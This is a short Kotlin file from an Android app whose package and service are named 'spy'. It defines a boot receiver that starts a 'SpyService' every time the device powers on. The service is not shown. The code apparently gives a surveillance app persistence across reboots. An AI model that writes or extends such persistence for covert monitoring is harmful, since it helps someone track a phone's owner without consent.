package com.venice.spy

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        val si = Intent(ctx, SpyService::class.java)
        if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(si)
        else ctx.startService(si)
    }
}